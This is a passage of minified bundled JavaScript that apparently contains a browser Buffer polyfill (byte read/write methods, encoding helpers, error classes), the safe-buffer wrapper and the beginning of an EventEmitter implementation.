                for (; ++Ye < Je && (Ge *= 256); )
                    _t += this[ze + Ye] * Ge;
                return _t
            }
            ,
            q.prototype.readUintBE = q.prototype.readUIntBE = function(ze, Je, ht) {
                ze = ze >>> 0,
                Je = Je >>> 0,
                ht || vt(ze, Je, this.length);
                let _t = this[ze + --Je]
                  , Ge = 1;
                for (; Je > 0 && (Ge *= 256); )
                    _t += this[ze + --Je] * Ge;
                return _t
            }
            ,
            q.prototype.readUint8 = q.prototype.readUInt8 = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 1, this.length),
                this[ze]
            }
            ,
            q.prototype.readUint16LE = q.prototype.readUInt16LE = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 2, this.length),
                this[ze] | this[ze + 1] << 8
            }
            ,
            q.prototype.readUint16BE = q.prototype.readUInt16BE = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 2, this.length),
                this[ze] << 8 | this[ze + 1]
            }
            ,
            q.prototype.readUint32LE = q.prototype.readUInt32LE = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 4, this.length),
                (this[ze] | this[ze + 1] << 8 | this[ze + 2] << 16) + this[ze + 3] * 16777216
            }
            ,
            q.prototype.readUint32BE = q.prototype.readUInt32BE = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 4, this.length),
                this[ze] * 16777216 + (this[ze + 1] << 16 | this[ze + 2] << 8 | this[ze + 3])
            }
            ,
            q.prototype.readBigUInt64LE = Ft(function(ze) {
                ze = ze >>> 0,
                dt(ze, "offset");
                const Je = this[ze]
                  , ht = this[ze + 7];
                (Je === void 0 || ht === void 0) && Et(ze, this.length - 8);
                const _t = Je + this[++ze] * 2 ** 8 + this[++ze] * 2 ** 16 + this[++ze] * 2 ** 24
                  , Ge = this[++ze] + this[++ze] * 2 ** 8 + this[++ze] * 2 ** 16 + ht * 2 ** 24;
                return BigInt(_t) + (BigInt(Ge) << BigInt(32))
            }),
            q.prototype.readBigUInt64BE = Ft(function(ze) {
                ze = ze >>> 0,
                dt(ze, "offset");
                const Je = this[ze]
                  , ht = this[ze + 7];
                (Je === void 0 || ht === void 0) && Et(ze, this.length - 8);
                const _t = Je * 2 ** 24 + this[++ze] * 2 ** 16 + this[++ze] * 2 ** 8 + this[++ze]
                  , Ge = this[++ze] * 2 ** 24 + this[++ze] * 2 ** 16 + this[++ze] * 2 ** 8 + ht;
                return (BigInt(_t) << BigInt(32)) + BigInt(Ge)
            }),
            q.prototype.readIntLE = function(ze, Je, ht) {
                ze = ze >>> 0,
                Je = Je >>> 0,
                ht || vt(ze, Je, this.length);
                let _t = this[ze]
                  , Ge = 1
                  , Ye = 0;
                for (; ++Ye < Je && (Ge *= 256); )
                    _t += this[ze + Ye] * Ge;
                return Ge *= 128,
                _t >= Ge && (_t -= Math.pow(2, 8 * Je)),
                _t
            }
            ,
            q.prototype.readIntBE = function(ze, Je, ht) {
                ze = ze >>> 0,
                Je = Je >>> 0,
                ht || vt(ze, Je, this.length);
                let _t = Je
                  , Ge = 1
                  , Ye = this[ze + --_t];
                for (; _t > 0 && (Ge *= 256); )
                    Ye += this[ze + --_t] * Ge;
                return Ge *= 128,
                Ye >= Ge && (Ye -= Math.pow(2, 8 * Je)),
                Ye
            }
            ,
            q.prototype.readInt8 = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 1, this.length),
                this[ze] & 128 ? (255 - this[ze] + 1) * -1 : this[ze]
            }
            ,
            q.prototype.readInt16LE = function(ze, Je) {
                ze = ze >>> 0,
                Je || vt(ze, 2, this.length);
                const ht = this[ze] | this[ze + 1] << 8;
                return ht & 32768 ? ht | 4294901760 : ht
            }
            ,
            q.prototype.readInt16BE = function(ze, Je) {
                ze = ze >>> 0,
                Je || vt(ze, 2, this.length);
                const ht = this[ze + 1] | this[ze] << 8;
                return ht & 32768 ? ht | 4294901760 : ht
            }
            ,
            q.prototype.readInt32LE = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 4, this.length),
                this[ze] | this[ze + 1] << 8 | this[ze + 2] << 16 | this[ze + 3] << 24
            }
            ,
            q.prototype.readInt32BE = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 4, this.length),
                this[ze] << 24 | this[ze + 1] << 16 | this[ze + 2] << 8 | this[ze + 3]
            }
            ,
            q.prototype.readBigInt64LE = Ft(function(ze) {
                ze = ze >>> 0,
                dt(ze, "offset");
                const Je = this[ze]
                  , ht = this[ze + 7];
                (Je === void 0 || ht === void 0) && Et(ze, this.length - 8);
                const _t = this[ze + 4] + this[ze + 5] * 2 ** 8 + this[ze + 6] * 2 ** 16 + (ht << 24);
                return (BigInt(_t) << BigInt(32)) + BigInt(Je + this[++ze] * 2 ** 8 + this[++ze] * 2 ** 16 + this[++ze] * 2 ** 24)
            }),
            q.prototype.readBigInt64BE = Ft(function(ze) {
                ze = ze >>> 0,
                dt(ze, "offset");
                const Je = this[ze]
                  , ht = this[ze + 7];
                (Je === void 0 || ht === void 0) && Et(ze, this.length - 8);
                const _t = (Je << 24) + this[++ze] * 2 ** 16 + this[++ze] * 2 ** 8 + this[++ze];
                return (BigInt(_t) << BigInt(32)) + BigInt(this[++ze] * 2 ** 24 + this[++ze] * 2 ** 16 + this[++ze] * 2 ** 8 + ht)
            }),
            q.prototype.readFloatLE = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 4, this.length),
                pe.read(this, ze, !0, 23, 4)
            }
            ,
            q.prototype.readFloatBE = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 4, this.length),
                pe.read(this, ze, !1, 23, 4)
            }
            ,
            q.prototype.readDoubleLE = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 8, this.length),
                pe.read(this, ze, !0, 52, 8)
            }
            ,
            q.prototype.readDoubleBE = function(ze, Je) {
                return ze = ze >>> 0,
                Je || vt(ze, 8, this.length),
                pe.read(this, ze, !1, 52, 8)
            }
            ;
            function we(at, ze, Je, ht, _t, Ge) {
                if (!q.isBuffer(at))
                    throw new TypeError('"buffer" argument must be a Buffer instance');
                if (ze > _t || ze < Ge)
                    throw new RangeError('"value" argument is out of bounds');
                if (Je + ht > at.length)
                    throw new RangeError("Index out of range")
            }
            q.prototype.writeUintLE = q.prototype.writeUIntLE = function(ze, Je, ht, _t) {
                if (ze = +ze,
                Je = Je >>> 0,
                ht = ht >>> 0,
                !_t) {
                    const it = Math.pow(2, 8 * ht) - 1;
                    we(this, ze, Je, ht, it, 0)
                }
                let Ge = 1
                  , Ye = 0;
                for (this[Je] = ze & 255; ++Ye < ht && (Ge *= 256); )
                    this[Je + Ye] = ze / Ge & 255;
                return Je + ht
            }
            ,
            q.prototype.writeUintBE = q.prototype.writeUIntBE = function(ze, Je, ht, _t) {
                if (ze = +ze,
                Je = Je >>> 0,
                ht = ht >>> 0,
                !_t) {
                    const it = Math.pow(2, 8 * ht) - 1;
                    we(this, ze, Je, ht, it, 0)
                }
                let Ge = ht - 1
                  , Ye = 1;
                for (this[Je + Ge] = ze & 255; --Ge >= 0 && (Ye *= 256); )
                    this[Je + Ge] = ze / Ye & 255;
                return Je + ht
            }
            ,
            q.prototype.writeUint8 = q.prototype.writeUInt8 = function(ze, Je, ht) {
                return ze = +ze,
                Je = Je >>> 0,
                ht || we(this, ze, Je, 1, 255, 0),
                this[Je] = ze & 255,
                Je + 1
            }
            ,
            q.prototype.writeUint16LE = q.prototype.writeUInt16LE = function(ze, Je, ht) {
                return ze = +ze,
                Je = Je >>> 0,
                ht || we(this, ze, Je, 2, 65535, 0),
                this[Je] = ze & 255,
                this[Je + 1] = ze >>> 8,
                Je + 2
            }
            ,
            q.prototype.writeUint16BE = q.prototype.writeUInt16BE = function(ze, Je, ht) {
                return ze = +ze,
                Je = Je >>> 0,
                ht || we(this, ze, Je, 2, 65535, 0),
                this[Je] = ze >>> 8,
                this[Je + 1] = ze & 255,
                Je + 2
            }
            ,
            q.prototype.writeUint32LE = q.prototype.writeUInt32LE = function(ze, Je, ht) {
                return ze = +ze,
                Je = Je >>> 0,
                ht || we(this, ze, Je, 4, 4294967295, 0),
                this[Je + 3] = ze >>> 24,
                this[Je + 2] = ze >>> 16,
                this[Je + 1] = ze >>> 8,
                this[Je] = ze & 255,
                Je + 4
            }
            ,
            q.prototype.writeUint32BE = q.prototype.writeUInt32BE = function(ze, Je, ht) {
                return ze = +ze,
                Je = Je >>> 0,
                ht || we(this, ze, Je, 4, 4294967295, 0),
                this[Je] = ze >>> 24,
                this[Je + 1] = ze >>> 16,
                this[Je + 2] = ze >>> 8,
                this[Je + 3] = ze & 255,
                Je + 4
            }
            ;
            function _e(at, ze, Je, ht, _t) {
                rt(ze, ht, _t, at, Je, 7);
                let Ge = Number(ze & BigInt(4294967295));
                at[Je++] = Ge,
                Ge = Ge >> 8,
                at[Je++] = Ge,
                Ge = Ge >> 8,
                at[Je++] = Ge,
                Ge = Ge >> 8,
                at[Je++] = Ge;
                let Ye = Number(ze >> BigInt(32) & BigInt(4294967295));
                return at[Je++] = Ye,
                Ye = Ye >> 8,
                at[Je++] = Ye,
                Ye = Ye >> 8,
                at[Je++] = Ye,
                Ye = Ye >> 8,
                at[Je++] = Ye,
                Je
            }
            function Ce(at, ze, Je, ht, _t) {
                rt(ze, ht, _t, at, Je, 7);
                let Ge = Number(ze & BigInt(4294967295));
                at[Je + 7] = Ge,
                Ge = Ge >> 8,
                at[Je + 6] = Ge,
                Ge = Ge >> 8,
                at[Je + 5] = Ge,
                Ge = Ge >> 8,
                at[Je + 4] = Ge;
                let Ye = Number(ze >> BigInt(32) & BigInt(4294967295));
                return at[Je + 3] = Ye,
                Ye = Ye >> 8,
                at[Je + 2] = Ye,
                Ye = Ye >> 8,
                at[Je + 1] = Ye,
                Ye = Ye >> 8,
                at[Je] = Ye,
                Je + 8
            }
            q.prototype.writeBigUInt64LE = Ft(function(ze, Je=0) {
                return _e(this, ze, Je, BigInt(0), BigInt("0xffffffffffffffff"))
            }),
            q.prototype.writeBigUInt64BE = Ft(function(ze, Je=0) {
                return Ce(this, ze, Je, BigInt(0), BigInt("0xffffffffffffffff"))
            }),
            q.prototype.writeIntLE = function(ze, Je, ht, _t) {
                if (ze = +ze,
                Je = Je >>> 0,
                !_t) {
                    const Fe = Math.pow(2, 8 * ht - 1);
                    we(this, ze, Je, ht, Fe - 1, -Fe)
                }
                let Ge = 0
                  , Ye = 1
                  , it = 0;
                for (this[Je] = ze & 255; ++Ge < ht && (Ye *= 256); )
                    ze < 0 && it === 0 && this[Je + Ge - 1] !== 0 && (it = 1),
                    this[Je + Ge] = (ze / Ye >> 0) - it & 255;
                return Je + ht
            }
            ,
            q.prototype.writeIntBE = function(ze, Je, ht, _t) {
                if (ze = +ze,
                Je = Je >>> 0,
                !_t) {
                    const Fe = Math.pow(2, 8 * ht - 1);
                    we(this, ze, Je, ht, Fe - 1, -Fe)
                }
                let Ge = ht - 1
                  , Ye = 1
                  , it = 0;
                for (this[Je + Ge] = ze & 255; --Ge >= 0 && (Ye *= 256); )
                    ze < 0 && it === 0 && this[Je + Ge + 1] !== 0 && (it = 1),
                    this[Je + Ge] = (ze / Ye >> 0) - it & 255;
                return Je + ht
            }
            ,
            q.prototype.writeInt8 = function(ze, Je, ht) {
                return ze = +ze,
                Je = Je >>> 0,
                ht || we(this, ze, Je, 1, 127, -128),
                ze < 0 && (ze = 255 + ze + 1),
                this[Je] = ze & 255,
                Je + 1
            }
            ,
            q.prototype.writeInt16LE = function(ze, Je, ht) {
                return ze = +ze,
                Je = Je >>> 0,
                ht || we(this, ze, Je, 2, 32767, -32768),
                this[Je] = ze & 255,
                this[Je + 1] = ze >>> 8,
                Je + 2
            }
            ,
            q.prototype.writeInt16BE = function(ze, Je, ht) {
                return ze = +ze,
                Je = Je >>> 0,
                ht || we(this, ze, Je, 2, 32767, -32768),
                this[Je] = ze >>> 8,
                this[Je + 1] = ze & 255,
                Je + 2
            }
            ,
            q.prototype.writeInt32LE = function(ze, Je, ht) {
                return ze = +ze,
                Je = Je >>> 0,
                ht || we(this, ze, Je, 4, 2147483647, -2147483648),
                this[Je] = ze & 255,
                this[Je + 1] = ze >>> 8,
                this[Je + 2] = ze >>> 16,
                this[Je + 3] = ze >>> 24,
                Je + 4
            }
            ,
            q.prototype.writeInt32BE = function(ze, Je, ht) {
                return ze = +ze,
                Je = Je >>> 0,
                ht || we(this, ze, Je, 4, 2147483647, -2147483648),
                ze < 0 && (ze = 4294967295 + ze + 1),
                this[Je] = ze >>> 24,
                this[Je + 1] = ze >>> 16,
                this[Je + 2] = ze >>> 8,
                this[Je + 3] = ze & 255,
                Je + 4
            }
            ,
            q.prototype.writeBigInt64LE = Ft(function(ze, Je=0) {
                return _e(this, ze, Je, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
            }),
            q.prototype.writeBigInt64BE = Ft(function(ze, Je=0) {
                return Ce(this, ze, Je, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
            });
            function st(at, ze, Je, ht, _t, Ge) {
                if (Je + ht > at.length)
                    throw new RangeError("Index out of range");
                if (Je < 0)
                    throw new RangeError("Index out of range")
            }
            function et(at, ze, Je, ht, _t) {
                return ze = +ze,
                Je = Je >>> 0,
                _t || st(at, ze, Je, 4),
                pe.write(at, ze, Je, ht, 23, 4),
                Je + 4
            }
            q.prototype.writeFloatLE = function(ze, Je, ht) {
                return et(this, ze, Je, !0, ht)
            }
            ,
            q.prototype.writeFloatBE = function(ze, Je, ht) {
                return et(this, ze, Je, !1, ht)
            }
            ;
            function tt(at, ze, Je, ht, _t) {
                return ze = +ze,
                Je = Je >>> 0,
                _t || st(at, ze, Je, 8),
                pe.write(at, ze, Je, ht, 52, 8),
                Je + 8
            }
            q.prototype.writeDoubleLE = function(ze, Je, ht) {
                return tt(this, ze, Je, !0, ht)
            }
            ,
            q.prototype.writeDoubleBE = function(ze, Je, ht) {
                return tt(this, ze, Je, !1, ht)
            }
            ,
            q.prototype.copy = function(ze, Je, ht, _t) {
                if (!q.isBuffer(ze))
                    throw new TypeError("argument should be a Buffer");
                if (ht || (ht = 0),
                !_t && _t !== 0 && (_t = this.length),
                Je >= ze.length && (Je = ze.length),
                Je || (Je = 0),
                _t > 0 && _t < ht && (_t = ht),
                _t === ht || ze.length === 0 || this.length === 0)
                    return 0;
                if (Je < 0)
                    throw new RangeError("targetStart out of bounds");
                if (ht < 0 || ht >= this.length)
                    throw new RangeError("Index out of range");
                if (_t < 0)
                    throw new RangeError("sourceEnd out of bounds");
                _t > this.length && (_t = this.length),
                ze.length - Je < _t - ht && (_t = ze.length - Je + ht);
                const Ge = _t - ht;
                return this === ze && typeof xe.prototype.copyWithin == "function" ? this.copyWithin(Je, ht, _t) : xe.prototype.set.call(ze, this.subarray(ht, _t), Je),
                Ge
            }
            ,
            q.prototype.fill = function(ze, Je, ht, _t) {
                if (typeof ze == "string") {
                    if (typeof Je == "string" ? (_t = Je,
                    Je = 0,
                    ht = this.length) : typeof ht == "string" && (_t = ht,
                    ht = this.length),
                    _t !== void 0 && typeof _t != "string")
                        throw new TypeError("encoding must be a string");
                    if (typeof _t == "string" && !q.isEncoding(_t))
                        throw new TypeError("Unknown encoding: " + _t);
                    if (ze.length === 1) {
                        const Ye = ze.charCodeAt(0);
                        (_t === "utf8" && Ye < 128 || _t === "latin1") && (ze = Ye)
                    }
                } else
                    typeof ze == "number" ? ze = ze & 255 : typeof ze == "boolean" && (ze = Number(ze));
                if (Je < 0 || this.length < Je || this.length < ht)
                    throw new RangeError("Out of range index");
                if (ht <= Je)
                    return this;
                Je = Je >>> 0,
                ht = ht === void 0 ? this.length : ht >>> 0,
                ze || (ze = 0);
                let Ge;
                if (typeof ze == "number")
                    for (Ge = Je; Ge < ht; ++Ge)
                        this[Ge] = ze;
                else {
                    const Ye = q.isBuffer(ze) ? ze : q.from(ze, _t)
                      , it = Ye.length;
                    if (it === 0)
                        throw new TypeError('The value "' + ze + '" is invalid for argument "value"');
                    for (Ge = 0; Ge < ht - Je; ++Ge)
                        this[Ge + Je] = Ye[Ge % it]
                }
                return this
            }
            ;
            const He = {};
            function ke(at, ze, Je) {
                He[at] = class extends Je {
                    constructor() {
                        super(),
                        Object.defineProperty(this, "message", {
                            value: ze.apply(this, arguments),
                            writable: !0,
                            configurable: !0
                        }),
                        this.name = `${this.name} [${at}]`,
                        this.stack,
                        delete this.name
                    }
                    get code() {
                        return at
                    }
                    set code(_t) {
                        Object.defineProperty(this, "code", {
                            configurable: !0,
                            enumerable: !0,
                            value: _t,
                            writable: !0
                        })
                    }
                    toString() {
                        return `${this.name} [${at}]: ${this.message}`
                    }
                }
            }
            ke("ERR_BUFFER_OUT_OF_BOUNDS", function(at) {
                return at ? `${at} is outside of buffer bounds` : "Attempt to access memory outside buffer bounds"
            }, RangeError),
            ke("ERR_INVALID_ARG_TYPE", function(at, ze) {
                return `The "${at}" argument must be of type number. Received type ${typeof ze}`
            }, TypeError),
            ke("ERR_OUT_OF_RANGE", function(at, ze, Je) {
                let ht = `The value of "${at}" is out of range.`
                  , _t = Je;
                return Number.isInteger(Je) && Math.abs(Je) > 2 ** 32 ? _t = Me(String(Je)) : typeof Je == "bigint" && (_t = String(Je),
                (Je > BigInt(2) ** BigInt(32) || Je < -(BigInt(2) ** BigInt(32))) && (_t = Me(_t)),
                _t += "n"),
                ht += ` It must be ${ze}. Received ${_t}`,
                ht
            }, RangeError);
            function Me(at) {
                let ze = ""
                  , Je = at.length;
                const ht = at[0] === "-" ? 1 : 0;
                for (; Je >= ht + 4; Je -= 3)
                    ze = `_${at.slice(Je - 3, Je)}${ze}`;
                return `${at.slice(0, Je)}${ze}`
            }
            function Ue(at, ze, Je) {
                dt(ze, "offset"),
                (at[ze] === void 0 || at[ze + Je] === void 0) && Et(ze, at.length - (Je + 1))
            }
            function rt(at, ze, Je, ht, _t, Ge) {
                if (at > Je || at < ze) {
                    const Ye = typeof ze == "bigint" ? "n" : "";
                    let it;
                    throw ze === 0 || ze === BigInt(0) ? it = `>= 0${Ye} and < 2${Ye} ** ${(Ge + 1) * 8}${Ye}` : it = `>= -(2${Ye} ** ${(Ge + 1) * 8 - 1}${Ye}) and < 2 ** ${(Ge + 1) * 8 - 1}${Ye}`,
                    new He.ERR_OUT_OF_RANGE("value",it,at)
                }
                Ue(ht, _t, Ge)
            }
            function dt(at, ze) {
                if (typeof at != "number")
                    throw new He.ERR_INVALID_ARG_TYPE(ze,"number",at)
            }
            function Et(at, ze, Je) {
                throw Math.floor(at) !== at ? (dt(at, Je),
                new He.ERR_OUT_OF_RANGE("offset","an integer",at)) : ze < 0 ? new He.ERR_BUFFER_OUT_OF_BOUNDS : new He.ERR_OUT_OF_RANGE("offset",`>= 0 and <= ${ze}`,at)
            }
            const ft = /[^+/0-9A-Za-z-_]/g;
            function gt(at) {
                if (at = at.split("=")[0],
                at = at.trim().replace(ft, ""),
                at.length < 2)
                    return "";
                for (; at.length % 4 !== 0; )
                    at = at + "=";
                return at
            }
            function Yt(at, ze) {
                ze = ze || 1 / 0;
                let Je;
                const ht = at.length;
                let _t = null;
                const Ge = [];
                for (let Ye = 0; Ye < ht; ++Ye) {
                    if (Je = at.charCodeAt(Ye),
                    Je > 55295 && Je < 57344) {
                        if (!_t) {
                            if (Je > 56319) {
                                (ze -= 3) > -1 && Ge.push(239, 191, 189);
                                continue
                            } else if (Ye + 1 === ht) {
                                (ze -= 3) > -1 && Ge.push(239, 191, 189);
                                continue
                            }
                            _t = Je;
                            continue
                        }
                        if (Je < 56320) {
                            (ze -= 3) > -1 && Ge.push(239, 191, 189),
                            _t = Je;
                            continue
                        }
                        Je = (_t - 55296 << 10 | Je - 56320) + 65536
                    } else
                        _t && (ze -= 3) > -1 && Ge.push(239, 191, 189);
                    if (_t = null,
                    Je < 128) {
                        if ((ze -= 1) < 0)
                            break;
                        Ge.push(Je)
                    } else if (Je < 2048) {
                        if ((ze -= 2) < 0)
                            break;
                        Ge.push(Je >> 6 | 192, Je & 63 | 128)
                    } else if (Je < 65536) {
                        if ((ze -= 3) < 0)
                            break;
                        Ge.push(Je >> 12 | 224, Je >> 6 & 63 | 128, Je & 63 | 128)
                    } else if (Je < 1114112) {
                        if ((ze -= 4) < 0)
                            break;
                        Ge.push(Je >> 18 | 240, Je >> 12 & 63 | 128, Je >> 6 & 63 | 128, Je & 63 | 128)
                    } else
                        throw new Error("Invalid code point")
                }
                return Ge
            }
            function Ct(at) {
                const ze = [];
                for (let Je = 0; Je < at.length; ++Je)
                    ze.push(at.charCodeAt(Je) & 255);
                return ze
            }
            function Ot(at, ze) {
                let Je, ht, _t;
                const Ge = [];
                for (let Ye = 0; Ye < at.length && !((ze -= 2) < 0); ++Ye)
                    Je = at.charCodeAt(Ye),
                    ht = Je >> 8,
                    _t = Je % 256,
                    Ge.push(_t),
                    Ge.push(ht);
                return Ge
            }
            function Vt(at) {
                return he.toByteArray(gt(at))
            }
            function Pt(at, ze, Je, ht) {
                let _t;
                for (_t = 0; _t < ht && !(_t + Je >= ze.length || _t >= at.length); ++_t)
                    ze[_t + Je] = at[_t];
                return _t
            }
            function Bt(at, ze) {
                return at instanceof ze || at != null && at.constructor != null && at.constructor.name != null && at.constructor.name === ze.name
            }
            function xr(at) {
                return at !== at
            }
            const Dt = function() {
                const at = "0123456789abcdef"
                  , ze = new Array(256);
                for (let Je = 0; Je < 16; ++Je) {
                    const ht = Je * 16;
                    for (let _t = 0; _t < 16; ++_t)
                        ze[ht + _t] = at[Je] + at[_t]
                }
                return ze
            }();
            function Ft(at) {
                return typeof BigInt > "u" ? Mr : at
            }
            function Mr() {
                throw new Error("BigInt not supported")
            }
        }
        )(M);
        const ue = M.Buffer;
        _.Blob = M.Blob,
        _.BlobOptions = M.BlobOptions,
        _.Buffer = M.Buffer,
        _.File = M.File,
        _.FileOptions = M.FileOptions,
        _.INSPECT_MAX_BYTES = M.INSPECT_MAX_BYTES,
        _.SlowBuffer = M.SlowBuffer,
        _.TranscodeEncoding = M.TranscodeEncoding,
        _.atob = M.atob,
        _.btoa = M.btoa,
        _.constants = M.constants,
        _.default = ue,
        _.isAscii = M.isAscii,
        _.isUtf8 = M.isUtf8,
        _.kMaxLength = M.kMaxLength,
        _.kStringMaxLength = M.kStringMaxLength,
        _.resolveObjectURL = M.resolveObjectURL,
        _.transcode = M.transcode
    }(dist$3)),
    dist$3
}
/*! safe-buffer. MIT License. Feross Aboukhadijeh <https://feross.org/opensource> */
var hasRequiredSafeBuffer$1;
function requireSafeBuffer$1() {
    return hasRequiredSafeBuffer$1 || (hasRequiredSafeBuffer$1 = 1,
    function(_, M) {
        var j = requireDist$4()
          , O = j.Buffer;
        function x(b, X) {
            for (var Y in b)
                X[Y] = b[Y]
        }
        O.from && O.alloc && O.allocUnsafe && O.allocUnsafeSlow ? _.exports = j : (x(j, M),
        M.Buffer = w);
        function w(b, X, Y) {
            return O(b, X, Y)
        }
        w.prototype = Object.create(O.prototype),
        x(O, w),
        w.from = function(b, X, Y) {
            if (typeof b == "number")
                throw new TypeError("Argument must not be a number");
            return O(b, X, Y)
        }
        ,
        w.alloc = function(b, X, Y) {
            if (typeof b != "number")
                throw new TypeError("Argument must be a number");
            var F = O(b);
            return X !== void 0 ? typeof Y == "string" ? F.fill(X, Y) : F.fill(X) : F.fill(0),
            F
        }
        ,
        w.allocUnsafe = function(b) {
            if (typeof b != "number")
                throw new TypeError("Argument must be a number");
            return O(b)
        }
        ,
        w.allocUnsafeSlow = function(b) {
            if (typeof b != "number")
                throw new TypeError("Argument must be a number");
            return j.SlowBuffer(b)
        }
    }(safeBuffer$1, safeBuffer$1.exports)),
    safeBuffer$1.exports
}
var events$1 = {
    exports: {}
}, hasRequiredEvents$1;
function requireEvents$1() {
    if (hasRequiredEvents$1)
        return events$1.exports;
    hasRequiredEvents$1 = 1;
    var _ = typeof Reflect == "object" ? Reflect : null, M = _ && typeof _.apply == "function" ? _.apply : function(ye, be, xe) {
        return Function.prototype.apply.call(ye, be, xe)
    }
    , j;
    _ && typeof _.ownKeys == "function" ? j = _.ownKeys : Object.getOwnPropertySymbols ? j = function(ye) {
        return Object.getOwnPropertyNames(ye).concat(Object.getOwnPropertySymbols(ye))
    }
    : j = function(ye) {
        return Object.getOwnPropertyNames(ye)
    }
    ;
    function O(pe) {
        console && console.warn && console.warn(pe)
    }
    var x = Number.isNaN || function(ye) {
        return ye !== ye
    }
    ;
    function w() {
        w.init.call(this)
    }
    events$1.exports = w,
    events$1.exports.once = ue,
    w.EventEmitter = w,
    w.prototype._events = void 0,
    w.prototype._eventsCount = 0,
    w.prototype._maxListeners = void 0;
    var b = 10;
    function X(pe) {
        if (typeof pe != "function")
            throw new TypeError('The "listener" argument must be of type Function. Received type ' + typeof pe)
    }
    Object.defineProperty(w, "defaultMaxListeners", {
        enumerable: !0,
        get: function() {
            return b
        },
        set: function(pe) {
            if (typeof pe != "number" || pe < 0 || x(pe))
                throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received ' + pe + ".");
            b = pe
        }
    }),
    w.init = function() {
        (this._events === void 0 || this._events === Object.getPrototypeOf(this)._events) && (this._events = Object.create(null),
        this._eventsCount = 0),
        this._maxListeners = this._maxListeners || void 0
    }
    ,
    w.prototype.setMaxListeners = function(ye) {
        if (typeof ye != "number" || ye < 0 || x(ye))
            throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received ' + ye + ".");
        return this._maxListeners = ye,
        this
    }
    ;
    function Y(pe) {
        return pe._maxListeners === void 0 ? w.defaultMaxListeners : pe._maxListeners
    }
    w.prototype.getMaxListeners = function() {
        return Y(this)
    }
    ,
    w.prototype.emit = function(ye) {
        for (var be = [], xe = 1; xe < arguments.length; xe++)
            be.push(arguments[xe]);
        var Ae = ye === "error"
          , Ee = this._events;
        if (Ee !== void 0)
            Ae = Ae && Ee.error === void 0;
        else if (!Ae)
            return !1;
        if (Ae) {
            var Be;
            if (be.length > 0 && (Be = be[0]),
            Be instanceof Error)
                throw Be;
            var ce = new Error("Unhandled error." + (Be ? " (" + Be.message + ")" : ""));
            throw ce.context = Be,
            ce
        }
        var q = Ee[ye];
        if (q === void 0)
            return !1;
        if (typeof q == "function")
            M(q, this, be);
        else
            for (var L = q.length, U = ae(q, L), xe = 0; xe < L; ++xe)
                M(U[xe], this, be);
        return !0
    }
    ;
    function F(pe, ye, be, xe) {
        var Ae, Ee, Be;
        if (X(be),
        Ee = pe._events,
        Ee === void 0 ? (Ee = pe._events = Object.create(null),
        pe._eventsCount = 0) : (Ee.newListener !== void 0 && (pe.emit("newListener", ye, be.listener ? be.listener : be),
        Ee = pe._events),
        Be = Ee[ye]),
        Be === void 0)
            Be = Ee[ye] = be,
            ++pe._eventsCount;
        else if (typeof Be == "function" ? Be = Ee[ye] = xe ? [be, Be] : [Be, be] : xe ? Be.unshift(be) : Be.push(be),
        Ae = Y(pe),
        Ae > 0 && Be.length > Ae && !Be.warned) {
            Be.warned = !0;
            var ce = new Error("Possible EventEmitter memory leak detected. " + Be.length + " " + String(ye) + " listeners added. Use emitter.setMaxListeners() to increase limit");
            ce.name = "MaxListenersExceededWarning",
            ce.emitter = pe,
            ce.type = ye,
            ce.count = Be.length,
            O(ce)
        }
        return pe
    }
    w.prototype.addListener = function(ye, be) {
        return F(this, ye, be, !1)
    }
    ,
    w.prototype.on = w.prototype.addListener,
    w.prototype.prependListener = function(ye, be) {
        return F(this, ye, be, !0)
    }
    ;
    function V() {
        if (!this.fired)
            return this.target.removeListener(this.type, this.wrapFn),
            this.fired = !0,
            arguments.length === 0 ? this.listener.call(this.target) : this.listener.apply(this.target, arguments)
    }
    function K(pe, ye, be) {
        var xe = {
            fired: !1,
            wrapFn: void 0,
            target: pe,
            type: ye,
            listener: be
        }
          , Ae = V.bind(xe);
        return Ae.listener = be,
        xe.wrapFn = Ae,
        Ae
    }
    w.prototype.once = function(ye, be) {
        return X(be),
        this.on(ye, K(this, ye, be)),
        this
    }
    ,
    w.prototype.prependOnceListener = function(ye, be) {
        return X(be),
        this.prependListener(ye, K(this, ye, be)),
        this
    }
    ,
    w.prototype.removeListener = function(ye, be) {
        var xe, Ae, Ee, Be, ce;
        if (X(be),
        Ae = this._events,
        Ae === void 0)
            return this;
        if (xe = Ae[ye],
        xe === void 0)
            return this;
        if (xe === be || xe.listener === be)
            --this._eventsCount === 0 ? this._events = Object.create(null) : (delete Ae[ye],
            Ae.removeListener && this.emit("removeListener", ye, xe.listener || be));
        else if (typeof xe != "function") {
            for (Ee = -1,
            Be = xe.length - 1; Be >= 0; Be--)
                if (xe[Be] === be || xe[Be].listener === be) {
                    ce = xe[Be].listener,
                    Ee = Be;
                    break
                }
            if (Ee < 0)
                return this;
            Ee === 0 ? xe.shift() : ne(xe, Ee),
            xe.length === 1 && (Ae[ye] = xe[0]),
            Ae.removeListener !== void 0 && this.emit("removeListener", ye, ce || be)
        }
        return this
    }
    ,
    w.prototype.off = w.prototype.removeListener,
    w.prototype.removeAllListeners = function(ye) {
        var be, xe, Ae;
        if (xe = this._events,
        xe === void 0)
            return this;
        if (xe.removeListener === void 0)
            return arguments.length === 0 ? (this._events = Object.create(null),
            this._eventsCount = 0) : xe[ye] !== void 0 && (--this._eventsCount === 0 ? this._events = Object.create(null) : delete xe[ye]),
            this;
        if (arguments.length === 0) {
            var Ee = Object.keys(xe), Be;
            for (Ae = 0; Ae < Ee.length; ++Ae)
                Be = Ee[Ae],
                Be !== "removeListener" && this.removeAllListeners(Be);
            return this.removeAllListeners("removeListener"),
            this._events = Object.create(null),
            this._eventsCount = 0,
            this
        }
        if (be = xe[ye],
